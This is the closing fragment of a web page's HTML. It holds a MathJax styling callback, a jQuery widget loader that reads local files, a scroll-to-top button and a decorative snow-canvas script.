  MathJax.Hub.Queue(function() {
    var all = MathJax.Hub.getAllJax(), i;
    for(i=0; i < all.length; i += 1) {
      all[i].SourceElement().parentNode.className += ' has-jax';
    }
  });
</script>
    
<script type="text/javascript">
$('.ajax_widgets').each(function(){var src=$(this).attr('data-src');if(src)$(this).load('/widgets/'+src+'.html');});
$.each(_js2load,function(index,obj){loadjs(obj.src,obj.charset)});
</script>

<div id="scroll2top">
<img src="/scroll2top/arrow.png"/>
</div>
<script src="/scroll2top/scroll2top.min.js"></script>
<div id="winterland">
  <canvas></canvas>
</div>
<script src="/js/winterland.min.js"></script>

  </body>
</html>
